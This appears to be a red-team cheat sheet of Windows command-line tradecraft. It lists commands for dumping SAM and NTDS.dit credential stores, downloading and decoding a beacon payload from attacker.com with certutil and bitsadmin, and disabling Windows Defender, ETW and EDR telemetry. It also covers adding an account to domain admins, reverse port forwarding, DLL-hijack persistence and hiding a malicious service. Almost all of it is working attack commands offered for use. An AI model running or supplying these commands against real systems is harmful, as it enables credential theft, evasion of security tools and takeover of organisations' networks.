- Harvest SAM:
	- `reg.exe save hklm\sam c:\temp\sam.save`
	- `reg.exe save hklm\security c:\temp\security.save`
	- `reg.exe save hklm\system c:\temp\system.save`
- Download files (w/o PowerShell)
	- `certutil.exe -urlcache -split -f "https://<url>/a.exe" a.exe`
	- `bitsadmin /transfer cthulhujob /download /priority normal http://<url>/a.exe`
- Disable ETW
	- `set COMPlus_ETWEnabled=0`
- Disable Windows Defender
	- `sc config TrustedInstaller binPath= "cmd.exe /C sc stop windefend && sc delete windefend" && sc start TrustedInstaller`
- Block ATP communications
	- `sc config TrustedInstaller binPath="cmd.exe /C sc stop diagtrack & sc config diagtrack binPath='lol'" && sc start TrustedInstaller`
- Encode and transfer/decode malicious file
	- (On attacker machine) `certutil -encode beacon64.exe file.txt`
	- (On target) `bitsadmin /Transfer myJob http://attacker.com/file.txt C:\windows\tasks\enc.txt && certutil -decode C:\windows\tasks\enc.txt C:\windows\tasks\cisa.exe && del C:\windows\tasks\enc.txt`
- Use Certutil to download exe
	- `certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe`
- Add current user to domain admins
	- `net group "domain admins" myusername /add /domain`
- Get user/domain SID:
	- `whoami /user`
- Create service to run with credentials
	- `sc.exe create MySvc2 binpath= c:\windows\system32\notepad.exe obj=CONTOSO.local\svcUser password=svc1234!`
- Create scheduled task to run with credentials
	- `schtasks.exe /create /tn notepaddaily /tr notepad.exe /sc daily /ru CONTOSO\TaskUser /rp task1234!`
- NewCredentials logon
	- `runas /netonly /user:CONTOSO\OtherUser cmd`
- Add/Delete firewall rule
	- `netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444`
	- `netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444`
- LOL Extract NTDS.dit
	- `vssadmin create shadow /for=C:`
	- `copy <shadow copy volume name>\Windows\ntds\ntds.dit C:\Windows\Temp\ntds.dit`
	- `reg SAVE HKLM\SYSTEM C:\Windows\Temp\SYS` OR `copy <shadow copy volume name>\Windows\System32\config\SYSTEM C:\Windows\Temp\SYS`
	- `vssadmin delete shadows /shadow=<shadow ID>`
- Query AD SPNs
	- `setspn -T <domain> -F -Q */*`
- Enumerate .NET version installed on a host
	- `reg queryv x64 HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full Release`
	- Cross-reference here: https://docs.microsoft.com/en-us/dotnet/framework/migration-guide/versions-and-dependencies
- Reverse port forward
	- Windows Firewall
		- Start rpfwd
			- `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp` - start rpfwd
		- Terminate rpfwd
			- `netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444` - terminate rpfwd
- Extract NTDS.dit
	```MSDOS
	ntdsutil
	activate instance ntds
	ifm
	create full C:\ntdsutil
	quit
	quit
	```

- Manually set Kerberos realm (for use with Rubeus, etc. through Proxifier)
	```
	ksetup /setrealm VIPR.LAB
	ksetup /addkdc VIPR.LAB dc01.vipr.lab 
	ksetup /setrealmflags VIPR.LAB tcpsupported
	```

- Create Volume Shadow Copy and copy SAM file out
	- `wmic shadowcopy call create Volume='C:\'`
	- `vssadmin list shadows`
		- Verify shadow file was created and check name
	- `copy \\?\GLOBALROOT\Device\<SHADOW COPY NAME>\windows\system32\config\sam C:\users\User1\Downloads\sam`
	- `copy \\?\GLOBALROOT\Device\<SHADOW COPY NAME>\windows\system32\config\sam C:\users\User1\Downloads\sam`
- Enumerate any domains trusted by our current domain
	- `nltest /trusted_domains`

- Persistence through WptsExtensions.dll:
	- `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PATH`
		- Query system path
	- Place malicious "WptsExtensions.dll" anywhere in that path
	- Executes on reboot
	- Delete DLL to remove persistence

- DNS black hole on EDR endpoint
	- Find API endpoint
		- `ipconfig /displaydns`
	- Black hole in hosts
		- `echo 127.0.0.1 http://<API domain endpoint> >> c:\windows\system32\drivers\etc\hosts`

- Listing user bookmarks
	- Chrome
		- `type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"`
	- Edge
		- `type "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"`
	- Brave
		- `type "C:\Users\%USERNAME%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"`

- Hide a Windows service (effectively sets all ACLs to "Deny" so literally no user can read the service)

```PowerShell
sc sdset evilsvc "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
```
	- TODO: remove the RP/WP for BA (local Admin) and SY (NT authority/SYSTEM) (too lazy to fix the SDDL string right now)
	- Read the SDDL: ConvertFrom-SDDLString